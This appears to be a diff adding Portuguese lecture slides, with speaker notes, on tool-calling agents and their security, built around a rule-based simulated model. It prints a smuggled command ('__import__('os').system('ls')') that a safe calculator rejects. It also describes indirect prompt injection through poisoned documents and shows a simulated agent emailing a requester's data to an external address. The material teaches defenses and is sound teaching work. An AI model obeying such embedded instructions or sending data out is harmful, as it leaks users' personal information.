@@ -1,0 +1,437 @@
+{
+ "capitulo": 14,
+ "titulo": "Ferramentas, fluxos e agentes",
+ "parte": "Parte IV — Adaptação e sistemas avançados",
+ "slides": [
+  {
+   "tipo": "objetivos",
+   "itens": [
+    "Explicar a chamada de ferramentas: o modelo propõe, o código valida, autoriza e executa",
+    "Montar um registro com esquema JSON, validação, erros legíveis, idempotência e tempo limite",
+    "Implementar o ciclo observar–decidir–agir com paradas, limite de passos e orçamento",
+    "Distinguir fluxos de agentes e escolher entre cinco padrões de fluxo",
+    "Aplicar segurança em camadas e reconhecer que a injeção indireta não é eliminada",
+    "Avaliar agentes por tarefa inteira, com IC bootstrap, e reconhecer modos de falha"
+   ],
+   "notas": "Abra explicando a mudança de risco deste capítulo: até aqui o modelo produzia texto, e um texto errado é um problema de qualidade; agora ele pode agir, e uma ação errada tem consequências no mundo. Por isso o capítulo trata de capacidade, ou seja ferramentas, ciclos e fluxos, e de contenção, ou seja validação, permissões, confirmação, auditoria e avaliação. Leia os objetivos e destaque a regra de ouro: o modelo decide o que pedir, o código decide o que acontece. Avise que todo o agente do capítulo usa um modelo simulado baseado em regras, que não é um LLM, e que as falhas são injetadas por sorteio. Pergunta à turma: que ação de um assistente vocês nunca deixariam sem confirmação? Armadilha: tratar agente como sinônimo de autonomia total."
+  },
+  {
+   "tipo": "topico",
+   "titulo": "Conversar ou agir?",
+   "itens": [
+    "Aluna: \"Atrasei 3 livros por 12 dias. Quanto devo? Dá tempo de trancar a matrícula?\"",
+    "Assistente que só conversa: cita a regra e pode errar a multiplicação",
+    "Assistente que age: consulta a norma, calcula, confere o calendário",
+    "Só registra o pedido depois que a aluna confirma",
+    "Texto errado é erro de qualidade; ação errada tem consequência no mundo"
+   ],
+   "notas": "Conte o caso da aluna da secretaria. Um assistente que só conversa pode citar a regra da multa e adivinhar o prazo, e a multiplicação pode sair errada. Um assistente que age consulta a norma, faz a conta com uma calculadora de verdade, confere a data-limite no calendário e só registra o pedido depois da confirmação da aluna. A diferença está em dar ferramentas ao modelo e cercá-las de regras. Faça a distinção de risco com clareza: um trancamento indevido ou um e-mail enviado a quem não devia não se desfazem com um pedido de desculpas. Todo o cenário é fictício, a Universidade Federal Aurora. Pergunta: o que é pior, uma resposta errada ou uma ação errada? Armadilha: dar poderes ao modelo antes de projetar a contenção."
+  },
+  {
+   "tipo": "analogia",
+   "titulo": "O garçom e a cozinha",
+   "texto": "O cliente faz o pedido pelo cardápio. O garçom confere se o prato existe. Quem cozinha não é o cliente.",
+   "detalhe": "Cliente = modelo; cardápio = esquema das ferramentas; garçom = seu código; cozinha = a função. Se o pedido vier ilegível, o garçom devolve com uma pergunta, em vez de inventar.",
+   "notas": "Use a cena de um restaurante. O cliente, que é o modelo, escolhe no cardápio, que é o esquema das ferramentas com nome, descrição e argumentos. O garçom, que é o seu código, confere se o prato existe, se o pedido faz sentido, se há restrição de alergia, que corresponde a permissões, e só então leva à cozinha, que é a função de verdade. O cliente nunca entra na cozinha. Se o pedido vier ilegível, como uma coisa qualquer, o garçom devolve com uma pergunta e não inventa; é o erro de validação legível que volta ao modelo. Pergunta à turma: o que acontece num restaurante em que o cliente pode entrar na cozinha? Armadilha: escrever no prompt a regra crítica em vez de impô-la no código; instruções não são garantias."
+  },
+  {
+   "tipo": "figura",
+   "titulo": "Uma chamada de ferramenta, passo a passo",
+   "fig": "f14_chamada",
+   "legenda": "O modelo apenas propõe; validação, autorização, confirmação e execução pertencem ao código.",
+   "itens": [
+    "1. O código descreve as ferramentas",
+    "2. O modelo propõe nome e argumentos",
+    "3. O código valida, autoriza e executa",
+    "4. O resultado volta ao modelo como dado"
+   ],
+   "notas": "Percorra a figura de cima para baixo. Primeiro, o código descreve ao modelo as ferramentas: nome, descrição de quando usar e esquema JSON dos argumentos. Segundo, o modelo propõe uma chamada, por exemplo consultar_prazo com evento igual a trancamento; isso é só texto estruturado e nada foi executado. Terceiro, o código valida os argumentos, confere permissões, pede confirmação se necessário e executa a função. Quarto, devolve o resultado ou o erro ao modelo, que decide o próximo passo. Insista: o modelo decide o que pedir, o código decide o que acontece. Tudo que for crítico, como permissão, valor máximo e confirmação, precisa estar no código. Pergunta: em qual dos quatro passos a segurança deve morar? Armadilha: achar que o modelo executa a função diretamente."
+  },
+  {
+   "tipo": "codigo",
+   "titulo": "Código: registro de ferramentas e validação",
+   "codigo": "kb = kb_com_envenenados()\namb = Ambiente(kb=kb)             # mundo fictício: hoje = 16/03/2026\nreg = criar_registro(amb)\nprint(\"ferramentas:\", reg.nomes())\nfor nome, args in [(\"consultar_prazo\", {\"evento\": \"formatura\"}),\n                   (\"voar\", {})]:\n    r = reg.executar(nome, args)   # erro vira resultado legível",
+   "saida": "ferramentas: ['calculadora', 'buscar_base', 'consultar_prazo', 'protocolar_trancamento', 'enviar_comunicado']\nconsultar_prazo{'evento': 'formatura'} -> ok=False erro=argumentos_invalidos\n    argumentos inválidos para consultar_prazo: evento: Input should be 'matricula', 'trancamento' or 'cancelamento\nvoar{} -> ok=False erro=desconhecida\n    ferramenta desconhecida: voar. Disponíveis: calculadora, buscar_base, consultar_prazo, protocolar_trancamento,",
+   "notas": "Mostre o registro com cinco ferramentas locais: calculadora, buscar_base com BM25, consultar_prazo, protocolar_trancamento e enviar_comunicado. O esquema é gerado a partir de uma classe pydantic, e a mesma classe valida a chamada, então esquema e validação nunca se desencontram. Na saída, duas falhas: o evento formatura não está na lista de matricula, trancamento ou cancelamento, e a ferramenta voar não existe. Observe que cada falha vira um resultado de erro legível, não uma exceção que derruba o programa; a mensagem diz o que estava errado, o que permite ao modelo corrigir e tentar de novo. As classes usam extra igual a forbid, que rejeita campos desconhecidos. Pergunta: por que devolver o motivo do erro ao modelo? Armadilha: capturar o erro e escondê-lo, sem informação para a correção."
+  },
+  {
+   "tipo": "topico",
+   "titulo": "Quatro propriedades de uma ferramenta de produção",
+   "itens": [
+    "Validação: nada entra na função sem passar pelo esquema",
+    "Erros como informação: argumento, desconhecida, tempo esgotado, não autorizada",
+    "Idempotência: repetir a mesma chave não duplica o efeito",
+    "Tempo limite: abandonar a espera não cancela o que a função já começou",
+    "Para ações com efeito, combine tempo limite com idempotência"
+   ],
+   "notas": "Estas quatro propriedades distinguem uma ferramenta de produção de uma de demonstração. Validação: o modelo pode errar tipos, inventar campos ou omitir obrigatórios, mesmo tendo recebido o esquema. Erros como informação: distinguimos erro de argumento, que o modelo pode corrigir, ferramenta desconhecida, tempo esgotado, exceção da ferramenta, não autorizada e confirmação negada; erros permanentes não devem ser repetidos às cegas. Idempotência: uma operação é idempotente se repeti-la tem o mesmo efeito que fazê-la uma vez, e o agente pode repetir chamadas por laço, nova tentativa ou dúvida. Tempo limite: uma ferramenta lenta não pode travar o agente, mas abandonar a espera não cancela o que já começou. Pergunta: o que acontece se um trancamento demorar e o agente tentar de novo? Armadilha: tempo limite sem idempotência."
+  },
+  {
+   "tipo": "codigo",
+   "titulo": "Código: calculadora segura e idempotência",
+   "codigo": "for expr in [\"15*0.2+3\", \"__import__('os').system('ls')\", \"9**9**9\"]:\n    print(expr, calcular_seguro(expr))   # percorre a árvore (ast)\narg = {\"matricula\": \"123456\", \"semestre\": \"2026.1\",\n       \"chave_idempotencia\": \"tr-123456-2026.1\"}\nreg.executar(\"protocolar_trancamento\", arg)   # duas vezes",
+   "saida": "'15*0.2+3'                         -> 6.0\n\"__import__('os').system('ls')\"    -> recusado: elemento não permitido: Call\n'9**9**9'                          -> recusado: potência fora dos limites (|expoente| ≤ 100, |base| ≤ 1e6)\nprotocolo TR-2026.1-123456 registrado\nprotocolo TR-2026.1-123456 (já existente)\nexecuções reais de protocolar_trancamento: 1",
+   "notas": "Nunca use eval em dados vindos de um modelo: eval executa qualquer código Python, inclusive importar o módulo os e rodar comandos. A calculadora do capítulo percorre a árvore sintática com ast e aceita apenas números, operadores aritméticos e parênteses, com limites para potências e tamanho. Na saída, a conta simples dá 6,0; a tentativa de chamar o sistema é recusada porque Call não é elemento permitido; e a torre de potências é barrada pelos limites. A regra geral é permitir por lista, o que aceitamos, e não bloquear por lista, o que lembramos de proibir. Depois, a mesma chamada de trancamento duas vezes com a mesma chave devolve o protocolo existente: houve uma execução real apenas. Pergunta: por que lista de permitidos é mais segura? Armadilha: confiar em uma lista de proibidos."
+  },
+  {
+   "tipo": "figura",
+   "titulo": "O ciclo observar–decidir–agir",
+   "fig": "f14_ciclo",
+   "legenda": "As condições de parada e os guardrails pertencem ao código que envolve o modelo.",
+   "itens": [
+    "Observar: montar o contexto",
+    "Decidir: chamar ferramenta ou responder",
+    "Agir: validar, autorizar, executar",
+    "Paradas: resposta, limite de passos, orçamento, detecção de laço",
+    "Parada sem resposta: encaminhar a um humano"
+   ],
+   "notas": "Um agente, neste capítulo, é um programa em que um modelo escolhe a próxima ação em um laço, usando ferramentas, até concluir. Observar é montar o contexto com a tarefa, o histórico, os resultados das ferramentas e a memória. Decidir é escolher entre chamar uma ferramenta, com argumentos, ou responder. Agir é o código validar, autorizar e executar, e o resultado vira a próxima observação. Sem condições de parada o laço pode não terminar, por isso usamos quatro: o modelo responde, limite de passos, orçamento de tokens e detecção de laço. Qualquer parada que não seja uma resposta termina encaminhando a um humano, e não inventando uma resposta. Pergunta: por que encaminhar é melhor que chutar? Armadilha: deixar o limite de passos fora do código."
+  },
+  {
+   "tipo": "formula",
+   "titulo": "Cada volta reprocessa o histórico",
+   "tex": "C(n) = n·c₀ + a·n(n−1)/2",
+   "explicacao": [
+    "c₀ = tokens do contexto inicial; a = tokens acrescentados por passo",
+    "O custo de entrada cresce de forma quadrática com os passos",
+    "Exemplo: c₀ = 400, a = 250, n = 6 dá 2 400 + 3 750 = 6 150 tokens",
+    "3 750 de 6 150 vêm do reprocessamento do histórico"
+   ],
+   "notas": "Derive em palavras: no passo k a entrada tem c zero mais k vezes a tokens; somando de zero a n menos 1, obtemos n vezes c zero mais a vezes n vezes n menos 1, sobre 2, uma soma quadrática em n. Exemplo resolvido: com 400 tokens iniciais e 250 por passo, em 6 passos o agente processa 6 150 tokens de entrada; para 100 000 tarefas são 615 milhões de tokens, e a 3 unidades por milhão, hipotéticas, 1 845 unidades. Mais da metade do custo, 3 750 de 6 150, vem do reprocessamento do histórico. Resumir e limitar passos reduzem esse termo; aqui o proxy de tokens é o número de palavras. Pergunta: o que dobra quando dobram os passos? Armadilha: achar que o custo é linear."
+  },
+  {
+   "tipo": "codigo",
+   "titulo": "Código: um traço real do agente simulado",
+   "codigo": "pergunta = \"Qual a multa por 12 dias de atraso na devolução de 3 livros?\"\nag = Agente(ModeloSimulado(Falhas(), semente=0), criar_registro(Ambiente(kb=kb)),\n            Politica(permitidas={\"buscar_base\", \"calculadora\"}))\nprint(ag.executar(pergunta).formatar())   # ModeloSimulado: regras, não é um LLM",
+   "saida": "  passo 1: chamar buscar_base({\"consulta\": \"multa por atraso ...\", \"top_k\": 3})\n      -> ok  [D12] Multas da biblioteca: ... multa de R$ 1,50 por dia e por exemplar.\n  passo 2: chamar calculadora({\"expressao\": \"1.50*12*3\"})\n      -> ok  54\n  PARADA: resposta | passos: 3 | tokens de entrada (proxy): 259\n  RESPOSTA: A multa total é R$ 54 (R$ 1,50 por dia e por exemplar; fonte: D12).",
+   "notas": "Reforce o rótulo: o ModeloSimulado é baseado em regras, não é um LLM. O traço mostra a composição de duas ferramentas: primeiro a busca na base fictícia traz o documento D12 com a regra de R$ 1,50 por dia e por exemplar; depois a calculadora faz 1,50 vezes 12 vezes 3, que dá 54; o terceiro passo é responder. A parada foi por resposta, com 3 passos e 259 tokens de entrada no proxy. Destaque que a conta feita pela ferramenta não dependeu do modelo saber multiplicar: a aritmética é delegada ao código, que acerta sempre. Essa delegação é uma das maiores vantagens do uso de ferramentas. Aponte também a citação da fonte na resposta. Pergunta: que outras tarefas deveriam ser delegadas ao código? Armadilha: confiar na aritmética do modelo."
+  },
+  {
+   "tipo": "analogia",
+   "titulo": "O estagiário com limite de tentativas",
+   "texto": "Um estagiário que, ao errar, repete a mesma coisa sem pedir ajuda. Você combina: no máximo seis tentativas e depois chama o chefe.",
+   "detalhe": "Laço, limite de passos e orçamento são as regras desse combinado. Parar e encaminhar a um humano é um desfecho seguro; inventar uma resposta para encerrar a tarefa não é.",
+   "notas": "Peça que a turma imagine um estagiário diligente que, quando o sistema recusa seu pedido, tenta exatamente a mesma coisa de novo, de novo e de novo. O gerente combina três regras: se repetir a mesma chamada, avisar e mudar de abordagem; se atingir seis tentativas, parar; se gastar além do orçamento, parar. Nos três casos, a saída é chamar um humano. Mostre a correspondência com o capítulo: o detector de repetição recusa a chamada idêntica, avisa o modelo e, se ele insistir, interrompe; o limite de passos impede o laço sem fim. No experimento, com falhas injetadas, uma chamada com argumento inválido foi corrigida na segunda tentativa. Pergunta: o que é pior, o estagiário que para ou o que inventa? Armadilha: aumentar o limite de passos automaticamente até dar certo."
+  },
+  {
+   "tipo": "tabela",
+   "titulo": "Cinco padrões de fluxo",
+   "cabecalho": [
+    "Padrão",
+    "Ideia",
+    "Risco"
+   ],
+   "linhas": [
+    [
+     "Encadeamento",
+     "Etapas em sequência, com portões de verificação",
+     "Erro cedo se propaga"
+    ],
+    [
+     "Roteamento",
+     "Classifica a entrada e segue uma rota especializada",
+     "Classificação errada"
+    ],
+    [
+     "Paralelização",
+     "Subtarefas independentes ao mesmo tempo, ou votação",
+     "Custo multiplicado"
+    ],
+    [
+     "Orquestrador–trabalhadores",
+     "Divide a tarefa conforme a entrada e delega",
+     "Divisão e síntese ruins"
+    ],
+    [
+     "Avaliador–otimizador",
+     "Um gera, outro avalia, em iterações",
+     "Critério proxy engana"
+    ]
+   ],
+   "notas": "Segundo a formulação pública da Anthropic de 2024, workflows são sistemas em que modelos e ferramentas são orquestrados por caminhos de código predefinidos, e agentes são sistemas em que o modelo dirige dinamicamente o próprio processo. A mesma publicação descreve estes cinco padrões, que usamos como vocabulário, e recomenda começar pela solução mais simples que funcione, porque agentes trocam latência e custo por desempenho. Percorra a tabela e dê um exemplo da secretaria para cada linha: roteamento entre cálculo e consulta; encadeamento de buscar e citar; paralelização de duas perguntas independentes. Pergunta à turma: em qual padrão o erro inicial é mais perigoso? No encadeamento, porque se propaga. Armadilha: confundir fluxo, em que o código define o caminho, com agente, em que o modelo escolhe os passos."
+  },
+  {
+   "tipo": "analogia",
+   "titulo": "Linha de montagem ou cozinheiro-chefe?",
+   "texto": "Linha de montagem: cada etapa é fixa, rápida e previsível. Chef: improvisa conforme os ingredientes, e custa mais.",
+   "detalhe": "Fluxo = linha de montagem (passos conhecidos). Agente = chef (ordem e número de passos dependem da situação). Muitas boas aplicações são híbridas: fluxo por fora, um agente de escopo estreito em um dos passos.",
+   "notas": "Compare uma fábrica de sanduíches com um chef que recebe a cesta do dia. Na linha de montagem, os passos são conhecidos, o resultado é previsível, é barato, rápido e fácil de testar e auditar; é um fluxo. O chef decide o que fazer conforme os ingredientes: é mais flexível, mas custa mais, demora mais e varia. Use a regra do capítulo: use um fluxo quando os passos são conhecidos, e um agente quando o número e a ordem dos passos dependem da situação e o ganho justificar custo, latência e risco. Muitas aplicações boas são híbridas. Mais adiante, a medição mostra o contraste: onde há rota prevista o fluxo iguala o agente, e onde não há rota ele não faz nada. Pergunta: qual tarefa do seu trabalho é linha de montagem? Armadilha: usar agente onde um fluxo bastaria."
+  },
+  {
+   "tipo": "codigo",
+   "titulo": "Código: padrões de fluxo, versão de regras",
+   "codigo": "print(\"ROTEAMENTO:\", fluxo_roteamento(\"Calcule: 3*(4+5)\", reg))\nprint(\"ROTEAMENTO (fora do escopo):\", fluxo_roteamento(pergunta, reg))\nfor i, rascunho, falhas in fluxo_avaliador_otimizador(q, reg):\n    print(f\"iteração {i}: {rascunho[:62]}... | reprovado por: {falhas}\")",
+   "saida": "ROTEAMENTO: ('Resultado: 27', ['calculadora'])\nROTEAMENTO (fora do escopo): ('tarefa fora do escopo do fluxo; encaminhando a um atendente', [])\nAVALIADOR–OTIMIZADOR, iteração 1: A defesa de dissertação é pública. (fonte: D33)... | reprovado por: ['sem fato verificável (algarismo)']\nAVALIADOR–OTIMIZADOR, iteração 2: A banca tem 3 membros, sendo pelo menos 1 externo ao programa.... | reprovado por: nada (aprovado)",
+   "notas": "São versões de regras, sem LLM, usando as mesmas ferramentas; servem para ver a estrutura de controle. O roteamento resolve a conta, dando 27, e recusa a tarefa da multa composta, que não cabia em nenhuma rota prevista: é o preço da previsibilidade. No avaliador-otimizador, a primeira candidata para o tamanho da banca diz só que a defesa é pública, e o avaliador a reprova por não trazer um algarismo; a segunda diz que a banca tem 3 membros, sendo pelo menos 1 externo, e é aprovada. Antecipe a ressalva: o critério ter algarismo é um proxy do que realmente queremos, e a medição na seção 14.13 mostra o efeito. Pergunta: que resposta correta não tem algarismo? O formato do e-mail institucional. Armadilha: confiar num avaliador automático como se fosse o objetivo real."
+  },
+  {
+   "tipo": "figura",
+   "titulo": "Segurança em camadas",
+   "fig": "f14_camadas",
+   "legenda": "Camadas de defesa entre a saída de uma ferramenta (não confiável) e uma ação no mundo. Nenhuma sozinha elimina o risco.",
+   "itens": [
+    "Menor privilégio",
+    "Validação de argumentos e destinos",
+    "Confirmação humana (padrão: negar)",
+    "Registro e auditoria encadeados",
+    "Sandbox com limites"
+   ],
+   "notas": "Um agente é um programa que executa ações a partir de texto não confiável, por isso a segurança se faz em camadas independentes, cada uma capaz de conter o dano se as outras falharem. Primeira, o princípio do menor privilégio: cada tarefa recebe só as ferramentas de que precisa; uma consulta de horário não deve ter acesso a enviar e-mail. Segunda, validação de argumentos e de destinos, como e-mail só para domínios da instituição. Terceira, confirmação humana para ações irreversíveis ou com efeito externo, e o padrão seguro é negar. Quarta, registro e auditoria à prova de adulteração, aqui encadeado por hash, com dados pessoais mascarados. Quinta, sandbox. Pergunta: qual camada vocês implementariam primeiro? Armadilha: achar que uma única camada basta."
+  },
+  {
+   "tipo": "codigo",
+   "titulo": "Código: privilégio, confirmação, auditoria, sandbox",
+   "codigo": "# (a) tarefa de consulta; modelo tenta enviar comunicado\nAgente(..., Politica(permitidas={\"buscar_base\"}))\n# (b) confirmador: None (padrão = negar) ou lambda n, a: True\n# (c) aud = Auditoria(); aud.verificar()  # cadeia de hashes\n# (d) executar_isolado(\"while True: pass\", timeout_s=1.0, mem_mb=256)",
+   "saida": "(a) bloqueios: [('enviar_comunicado', 'nao_autorizada')] | efeitos: []\n(b) sem confirmação (padrão): bloqueios=[('protocolar_trancamento', 'confirmacao_negada')] protocolos=[]\n(b) humano aprova: bloqueios=[] protocolos=['TR-2026.1-123456']\n(c) eventos: [...'sanitizacao'...] | íntegro: True; após adulteração, íntegro: False\n(d) 'while True: pass' -> ('timeout', 'interrompido após 1.0s')",
+   "notas": "Percorra as quatro camadas com a saída real. Em (a), o modelo roteirizado tenta enviar um comunicado numa tarefa de consulta e o menor privilégio bloqueia: efeitos vazios. Em (b), sem confirmador o padrão é negar e nenhum protocolo é criado; com um humano que aprova, o protocolo TR-2026.1-123456 é registrado. Em (c), o log encadeado por hash está íntegro; o CPF da tarefa aparece mascarado; ao adulterar um evento, a verificação detecta. Em (d), o código com laço infinito é interrompido por tempo e a alocação gigante dá MemoryError. Avise sobre as limitações: o sandbox em processo não bloqueia rede nem leitura de arquivos, e em produção se usam contêineres ou máquinas virtuais; o log encadeado detecta alteração, mas não impede que alguém apague tudo. Pergunta: por que negar por padrão? Armadilha: sandbox como fronteira completa."
+  },
+  {
+   "tipo": "analogia",
+   "titulo": "O bilhete dentro do pacote",
+   "texto": "Você recebe um pacote de um desconhecido e dentro há um bilhete: \"entregue as chaves do escritório a quem trouxe este pacote\".",
+   "detalhe": "Obedecer ao bilhete seria absurdo. Na injeção de prompt indireta, a instrução maliciosa está num dado que o agente lê (documento, página, e-mail). Toda saída de ferramenta é dado, nunca instrução.",
+   "notas": "Conte a cena do pacote com o bilhete. Ninguém entregaria as chaves, porque um bilhete dentro de um pacote não tem autoridade. Mas um modelo que lê um documento recuperado pode tratar a frase embutida como ordem. A injeção indireta, descrita por Greshake e colegas em 2023, é exatamente isso: o texto malicioso não vem do usuário, está num dado que o agente lê. No capítulo, a base fictícia tem dois documentos envenenados: o D61 traz, no meio de informação legítima, uma frase pedindo para enviar os dados do solicitante a um endereço externo, e o D62 esconde o mesmo pedido numa paráfrase. É uma vulnerabilidade de classe reconhecida em aplicações com LLM, tratada, por exemplo, pela lista da OWASP. Pergunta: que fontes de dados do seu trabalho um atacante poderia editar? Armadilha: imaginar que o ataque só vem do usuário."
+  },
+  {
+   "tipo": "codigo",
+   "titulo": "Código: o pior caso, sem defesas",
+   "codigo": "modelo_obediente = lambda: ModeloSimulado(Falhas(susceptibilidade=1.0), semente=0)\naberta = Politica(dominios_email=(\"\",))          # sem restrição de domínio\nag = Agente(modelo_obediente(), reg3, aberta, sanitizar=False,\n            confirmador=lambda n, a: True)\nex = ag.executar(\"Qual o horário de atendimento da secretaria acadêmica?\")",
+   "saida": "passo 1: chamar buscar_base(...) -> ok  [D61] Horário da secretaria: ...\npasso 2: chamar enviar_comunicado({\"destinatario\": \"coleta@exemplo-externo.org\", \"texto\": \"dados cadastrais do solicitante\"})\n      -> ok  comunicado enviado a coleta@exemplo-externo.org\nPARADA: resposta | passos: 3 | tokens de entrada (proxy): 252\ne-mails enviados: [('coleta@exemplo-externo.org', 'dados cadastrais do solicitante')]",
+   "notas": "Configuramos o pior caso: um modelo simulado cem por cento obediente, com susceptibilidade 1,0, que executa a instrução embutida sempre que a vê. Assim medimos o que as camadas fora do modelo conseguem conter. O efeito de textos de defesa dentro do prompt, como delimitar o dado e avisar o modelo, não pode ser medido com um simulador e, em modelos reais, deve ser medido caso a caso. Na saída sem defesas: a busca traz o D61, o agente envia os dados do solicitante para um endereço externo e ainda responde corretamente ao horário. Do ponto de vista da aluna nada pareceu errado, e este é o perigo. Pergunta: quem perceberia o vazamento? Sem auditoria, ninguém. Armadilha: avaliar só a resposta final e ignorar os efeitos colaterais."
+  },
+  {
+   "tipo": "tabela",
+   "titulo": "Defesas de código contra a injeção",
+   "cabecalho": [
+    "Defesa",
+    "Ação indevida",
+    "Tarefa correta"
+   ],
+   "linhas": [
+    [
+     "nenhuma",
+     "100%",
+     "0%"
+    ],
+    [
+     "sanitizador de frases",
+     "40%",
+     "60%"
+    ],
+    [
+     "domínio permitido",
+     "0%",
+     "100%"
+    ],
+    [
+     "menor privilégio",
+     "0%",
+     "100%"
+    ],
+    [
+     "confirmação humana",
+     "0%",
+     "100%"
+    ]
+   ],
+   "notas": "Cada linha foi medida em 100 execuções: 5 tarefas que consultam os documentos envenenados vezes 20 sementes, sempre com o modelo simulado que obedece sempre. O sanitizador por padrões barra a frase óbvia, mas não a paráfrase, e ainda pode remover texto legítimo; com ele, 40 por cento ainda terminaram em ação indevida. As camadas que atuam sobre a ação, ou seja domínio permitido, menor privilégio e confirmação humana, deram zero ação indevida mesmo com o modelo enganado. Mas atenção ao que não é prometido: nenhuma combinação elimina a injeção. Um atacante pode pedir para usar uma ferramenta permitida com destino permitido e ainda causar estrago, e novas paráfrases surgem. Mitigação não é eliminação. A robustez de modelos reais não foi medida. Pergunta: que defesa vocês combinariam? Armadilha: concluir que o problema está resolvido."
+  },
+  {
+   "tipo": "codigo",
+   "titulo": "Código: sucesso por tarefa, com IC sobre as tarefas",
+   "codigo": "T = gerar_tarefas()          # 87 tarefas, 20 sementes cada\nfor p in (0, 0.2, 0.4, 0.6, 0.8):\n    r = avaliar(T, ruido(p), kb, K=20, max_passos=6)\n    m, lo, hi = av.bootstrap_ic(r[\"taxa\"], n=1000, seed=0)",
+   "saida": "   p  sucesso           IC 95%  passos  tokens\n   0    0.885   [0.816; 0.943]    2.18      99\n 0.2    0.867   [0.797; 0.925]    2.30     104\n 0.4    0.839   [0.767; 0.899]    2.66     119\n 0.6    0.817   [0.751; 0.872]    2.73     134\n 0.8    0.679   [0.616; 0.733]    2.95     127",
+   "notas": "O conjunto tem 87 tarefas sintéticas: 40 perguntas à base, 15 cálculos, 10 multas, 9 prazos, 8 pedidos de trancamento, 2 deles fora do prazo, em que o correto é não protocolar, e 5 consultas aos documentos envenenados. Sucesso significa resposta certa, nenhum efeito proibido e o número esperado de protocolos. O intervalo de confiança é um bootstrap sobre as tarefas, e não sobre as execuções, porque as 20 execuções de uma tarefa são muito parecidas entre si. A primeira linha, p igual a zero, não é 1,00: 0,885, porque o agente herda os limites da RAG, como a recuperação BM25 e a escolha da frase. Os intervalos de valores vizinhos de p se sobrepõem; a queda só é clara entre extremos. Lembre: as falhas foram injetadas por nós. Pergunta: por que reamostrar execuções engana? Armadilha: intervalo falsamente estreito."
+  },
+  {
+   "tipo": "tabela",
+   "titulo": "Fluxo fixo ou agente, por tipo de tarefa",
+   "cabecalho": [
+    "Tipo",
+    "Fluxo (código)",
+    "Agente (p = 0,2)"
+   ],
+   "linhas": [
+    [
+     "kb",
+     "0,750",
+     "0,750"
+    ],
+    [
+     "calculo",
+     "1,000",
+     "1,000"
+    ],
+    [
+     "multa",
+     "0,000",
+     "0,900"
+    ],
+    [
+     "prazo",
+     "1,000",
+     "1,000"
+    ],
+    [
+     "trancar",
+     "0,000",
+     "0,925"
+    ],
+    [
+     "injecao",
+     "1,000",
+     "1,000"
+    ]
+   ],
+   "notas": "Comparamos o fluxo com roteamento, caminho fixo em código, com o agente com falhas de intensidade 0,2. Duas lições. Primeira: onde há rota, o fluxo é determinístico e, neste caso, iguala o agente, com custo menor e sem variabilidade: cálculo, prazo e consultas envenenadas. Segunda: onde não há rota, que são a multa composta e o pedido de trancamento, o fluxo não faz nada, zero; seria preciso escrever mais rotas, enquanto o agente generaliza para composições imprevistas, com 0,900 e 0,925, e paga com variabilidade e superfície de risco. Lembre que a variabilidade do agente aqui foi injetada por nós. Mencione também o limite de passos: com 2 passos o sucesso é 0,46, com 3 sobe a 0,76, com 6 chega a 0,84 e de 6 para 10 não muda. Pergunta: o que escolher para um novo serviço? Armadilha: começar pelo agente."
+  },
+  {
+   "tipo": "tabela",
+   "titulo": "Modos de falha de agentes",
+   "cabecalho": [
+    "Modo",
+    "Sintoma",
+    "Defesa"
+   ],
+   "linhas": [
+    [
+     "Laço",
+     "Repete a mesma ação",
+     "Detector de repetição; limite de passos"
+    ],
+    [
+     "Ferramenta errada",
+     "Escolhe ferramenta inadequada",
+     "Boas descrições; menor privilégio"
+    ],
+    [
+     "Argumentos inválidos",
+     "Fora do esquema",
+     "Esquema estrito; erro legível"
+    ],
+    [
+     "Deriva de objetivo",
+     "Persegue outra meta",
+     "Plano auditável; confirmação"
+    ],
+    [
+     "Parada prematura",
+     "Responde sem fazer o necessário",
+     "Pós-condições; evidência"
+    ],
+    [
+     "Efeito duplicado",
+     "Repete ação com efeito",
+     "Idempotência; confirmação"
+    ]
+   ],
+   "notas": "Resuma os modos de falha com a defesa de código para cada um; há ainda o custo descontrolado, tratado com orçamento e resumo de memória. Mostre o resultado medido com p igual a 0,8: 67,9 por cento de sucesso, 22,4 por cento de laços e 9,8 por cento de respostas incorretas. A mensagem é sobre a natureza dos desfechos: laços interrompidos são um desfecho seguro, o agente não concluiu, mas encaminhou; já a resposta incorreta é pior, porque parece concluída. Para tarefas de risco, a métrica que importa é o custo dos erros, e não só a taxa de sucesso: um agente que aborta e escala mais vezes pode ser preferível a outro que acerta um pouco mais, mas erra em silêncio. Pergunta: que erro seria mais caro na secretaria? Armadilha: confundir agente concluiu com agente acertou."
+  },
+  {
+   "tipo": "atencao",
+   "titulo": "MCP e adaptador real: o que NÃO afirmamos",
+   "itens": [
+    "MCP: padrão aberto anunciado pela Anthropic em 25/11/2024 para conectar assistentes a fontes de dados e ferramentas",
+    "Servidores expõem dados ou ferramentas; clientes (aplicações de IA) se conectam",
+    "Não foi possível consultar a especificação aqui: sem detalhes de mensagens ou versões",
+    "Ferramenta de terceiros continua sendo ferramenta: mesmas regras de segurança",
+    "Adaptador com a API do Claude: python-ni, NÃO executado; confira a documentação vigente"
+   ],
+   "notas": "Explique o MCP, o Model Context Protocol, apenas no que foi possível verificar: foi anunciado pela Anthropic em 25 de novembro de 2024 como padrão aberto para conectar assistentes de IA aos sistemas onde ficam os dados, em vez de integrações isoladas; servidores expõem fontes de dados ou ferramentas, e clientes são aplicações de IA. Seja honesto: a especificação oficial não pôde ser acessada neste ambiente, por isso não descrevemos mensagens, transportes ou versões. O princípio de engenharia vale de qualquer forma: ferramentas vindas de um servidor MCP continuam sendo ferramentas, com validação, menor privilégio, confirmação, auditoria e saídas tratadas como dado não confiável, e conectar uma ferramenta de terceiros amplia a superfície de ataque. O adaptador da seção 14.16 é python-ni e não foi executado. Pergunta: quem audita um servidor de terceiros? Armadilha: confiar por ser padronizado."
+  },
+  {
+   "tipo": "atencao",
+   "titulo": "Erros frequentes e limitações",
+   "itens": [
+    "Dar mais ferramentas do que a tarefa exige",
+    "Confiar no prompt como controle de segurança, em vez de impor no código",
+    "Ações irreversíveis sem confirmação nem chave de idempotência; usar eval",
+    "Medir o passo e não a tarefa inteira; reamostrar execuções em vez de tarefas",
+    "Aqui: modelo simulado, tarefas sintéticas e fáceis, base fictícia; números não valem para LLMs reais"
+   ],
